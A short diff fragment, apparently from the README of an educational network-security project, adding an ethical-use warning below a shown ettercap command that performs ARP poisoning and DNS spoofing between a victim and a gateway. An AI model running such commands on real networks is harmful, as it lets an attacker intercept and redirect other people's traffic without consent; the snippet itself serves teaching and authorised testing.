@@ -144,5 +144,6 @@ sudo nano /etc/ettercap/etter.dns
 # Run ettercap with ARP poisoning and DNS spoofing
 sudo ettercap -T -q -i eth0 -M arp:remote /victim_ip// /gateway_ip// -P dns_spoof
 
-
-
+```
+### Ethical Warning
+"This project is for educational purposes only. Do NOT use it on unauthorized networks or devices. Always get permission before testing."
